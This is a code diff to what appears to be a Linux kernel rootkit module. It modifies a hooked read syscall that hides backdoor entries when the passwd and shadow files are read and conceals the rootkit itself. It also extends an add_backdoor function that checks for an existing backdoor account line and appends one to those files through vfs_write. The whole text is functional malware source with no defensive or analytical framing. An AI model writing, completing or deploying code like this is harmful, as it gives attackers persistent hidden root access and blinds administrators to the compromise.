@@ -315,6 +315,7 @@ asmlinkage long hacked_read(unsigned int fd, char *buf, size_t count)
 	char *tmp_buf;
 	char *BACKDOOR;
 
+    //call original read
 	ret = (*orig_read)(fd, buf, count);
 
 	if(ret <= 0){
@@ -352,13 +353,14 @@ asmlinkage long hacked_read(unsigned int fd, char *buf, size_t count)
         ret = remove_rootkit(buf, ret);
     }
     
+    //check if it's the files we want
 	if(strcmp(pathname, PASSWD_FILE)==0){
 		BACKDOOR = BACKDOOR_PASSWD;
-	}
-
-	if(strcmp(pathname, SHADOW_FILE)==0){
+	} else if(strcmp(pathname, SHADOW_FILE)==0){
 		BACKDOOR = BACKDOOR_SHADOW;		
-	}
+	} else {
+        goto cleanup1;
+    }
 
 	if(!(strstr(buf, BACKDOOR))){
 		goto cleanup1;
@@ -375,6 +377,7 @@ asmlinkage long hacked_read(unsigned int fd, char *buf, size_t count)
 		goto cleanup2;
 	}
 
+    //remove backdoor in buf, change ret
 	while((strstr(tmp_buf, BACKDOOR))){
 		char *strBegin  = tmp_buf;
 		char *substrBegin = strstr(strBegin, BACKDOOR);
@@ -404,9 +407,13 @@ void add_backdoor(char * pathname)
     char * BACKDOOR;
     mm_segment_t old_fs;
 
+    char *buf;
+    bool has_backdoor =false;
+    int page_count = 0;
+
     loff_t offset;
 
-    long ret;
+    unsigned long ret;
 
     if(strcmp(pathname, PASSWD_FILE)==0)
         BACKDOOR = BACKDOOR_PASSWD;
@@ -423,6 +430,46 @@ void add_backdoor(char * pathname)
         goto exit;
     }
 
+    //check if backdoor is already inserted
+    buf = (char *) kmalloc(PAGE_SIZE, GFP_KERNEL);
+
+    if(!buf){
+        goto cleanup1;
+    }
+
+    has_backdoor = false;
+    ret = PAGE_SIZE;
+    offset = 0;
+    while(ret == PAGE_SIZE){
+        offset = page_count*PAGE_SIZE;
+
+        set_fs(get_ds());
+        ret = vfs_read(file, buf, PAGE_SIZE, &offset);
+        set_fs(old_fs);
+
+        if(ret < 0){
+            //DEBUG("read errors");
+            goto cleanup2;
+        }
+
+        page_count++;
+
+        if(strstr(buf, BACKDOOR)){
+            has_backdoor = true;
+            break;
+        }
+    }
+
+    if(has_backdoor){
+        //DEBUG(pathname);
+        //DEBUG("-----already has backdoor-------");
+        goto cleanup2;
+    }
+
+    //DEBUG(pathname);
+    //DEBUG("--- doesn't have backdoor. inserting---");
+
+    //seek offset to end of file
     offset = 0;
 
     set_fs(get_ds());
@@ -430,20 +477,28 @@ void add_backdoor(char * pathname)
     set_fs(old_fs);
 
     if(offset < 0){
-        goto cleanup;
+        goto cleanup2;
     }
+
+    //add backdoor to the end of file
+    ret = 0;
 
     set_fs(get_ds());
     ret = vfs_write(file, BACKDOOR, strlen(BACKDOOR),&offset);
     set_fs(old_fs);
 
     if(ret<0){
-        goto cleanup;
+        goto cleanup2;
     }
 
-cleanup:
-    if(!file)
+cleanup2:
+    if(buf)
+        kfree(buf);
+
+cleanup1:
+    if(file)
         filp_close(file, NULL);
+
 exit:
     return;
 }
